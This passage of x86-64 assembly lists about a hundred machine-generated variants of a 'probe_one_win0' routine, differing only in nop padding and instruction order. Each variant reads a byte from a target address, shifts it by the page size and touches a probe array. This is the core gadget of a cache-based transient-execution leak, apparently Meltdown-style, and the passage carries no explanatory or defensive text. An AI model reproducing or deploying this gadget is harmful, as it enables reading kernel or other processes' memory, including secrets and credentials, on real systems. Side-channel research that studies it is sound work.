	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 403
.Lprobe_one_win0_var403:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 404
.Lprobe_one_win0_var404:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 405
.Lprobe_one_win0_var405:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 406
.Lprobe_one_win0_var406:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 407
.Lprobe_one_win0_var407:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 408
.Lprobe_one_win0_var408:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 409
.Lprobe_one_win0_var409:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 410
.Lprobe_one_win0_var410:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 411
.Lprobe_one_win0_var411:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 412
.Lprobe_one_win0_var412:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 413
.Lprobe_one_win0_var413:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 414
.Lprobe_one_win0_var414:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 415
.Lprobe_one_win0_var415:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 416
.Lprobe_one_win0_var416:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 417
.Lprobe_one_win0_var417:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 418
.Lprobe_one_win0_var418:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 419
.Lprobe_one_win0_var419:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 420
.Lprobe_one_win0_var420:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 421
.Lprobe_one_win0_var421:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 422
.Lprobe_one_win0_var422:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 423
.Lprobe_one_win0_var423:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 424
.Lprobe_one_win0_var424:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 425
.Lprobe_one_win0_var425:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 426
.Lprobe_one_win0_var426:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 427
.Lprobe_one_win0_var427:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 428
.Lprobe_one_win0_var428:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 429
.Lprobe_one_win0_var429:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 430
.Lprobe_one_win0_var430:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 431
.Lprobe_one_win0_var431:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 432
.Lprobe_one_win0_var432:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 433
.Lprobe_one_win0_var433:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 434
.Lprobe_one_win0_var434:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 435
.Lprobe_one_win0_var435:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 436
.Lprobe_one_win0_var436:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 437
.Lprobe_one_win0_var437:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 438
.Lprobe_one_win0_var438:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 439
.Lprobe_one_win0_var439:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 440
.Lprobe_one_win0_var440:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 441
.Lprobe_one_win0_var441:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 442
.Lprobe_one_win0_var442:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 443
.Lprobe_one_win0_var443:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 444
.Lprobe_one_win0_var444:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 445
.Lprobe_one_win0_var445:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 446
.Lprobe_one_win0_var446:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 447
.Lprobe_one_win0_var447:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 448
.Lprobe_one_win0_var448:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 449
.Lprobe_one_win0_var449:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 450
.Lprobe_one_win0_var450:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 451
.Lprobe_one_win0_var451:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 452
.Lprobe_one_win0_var452:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 453
.Lprobe_one_win0_var453:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 454
.Lprobe_one_win0_var454:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 455
.Lprobe_one_win0_var455:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 456
.Lprobe_one_win0_var456:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 457
.Lprobe_one_win0_var457:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 458
.Lprobe_one_win0_var458:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 459
.Lprobe_one_win0_var459:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 460
.Lprobe_one_win0_var460:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 461
.Lprobe_one_win0_var461:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 462
.Lprobe_one_win0_var462:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 463
.Lprobe_one_win0_var463:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 464
.Lprobe_one_win0_var464:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 465
.Lprobe_one_win0_var465:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 466
.Lprobe_one_win0_var466:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 467
.Lprobe_one_win0_var467:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 468
.Lprobe_one_win0_var468:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 469
.Lprobe_one_win0_var469:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 470
.Lprobe_one_win0_var470:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 471
.Lprobe_one_win0_var471:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 472
.Lprobe_one_win0_var472:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 473
.Lprobe_one_win0_var473:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 474
.Lprobe_one_win0_var474:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 475
.Lprobe_one_win0_var475:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 476
.Lprobe_one_win0_var476:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 477
.Lprobe_one_win0_var477:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 478
.Lprobe_one_win0_var478:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 479
.Lprobe_one_win0_var479:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 480
.Lprobe_one_win0_var480:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 481
.Lprobe_one_win0_var481:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 482
.Lprobe_one_win0_var482:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 483
.Lprobe_one_win0_var483:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 484
.Lprobe_one_win0_var484:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 485
.Lprobe_one_win0_var485:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 486
.Lprobe_one_win0_var486:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 487
.Lprobe_one_win0_var487:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 488
.Lprobe_one_win0_var488:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 489
.Lprobe_one_win0_var489:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 490
.Lprobe_one_win0_var490:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 491
.Lprobe_one_win0_var491:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 492
.Lprobe_one_win0_var492:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 493
.Lprobe_one_win0_var493:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 494
.Lprobe_one_win0_var494:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 495
.Lprobe_one_win0_var495:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 496
.Lprobe_one_win0_var496:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 497
.Lprobe_one_win0_var497:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 498
.Lprobe_one_win0_var498:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 499
.Lprobe_one_win0_var499:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 500
.Lprobe_one_win0_var500:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 501
.Lprobe_one_win0_var501:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 502
.Lprobe_one_win0_var502:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 503
.Lprobe_one_win0_var503:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 504
.Lprobe_one_win0_var504:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 505
.Lprobe_one_win0_var505:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 506
.Lprobe_one_win0_var506:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 507
.Lprobe_one_win0_var507:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
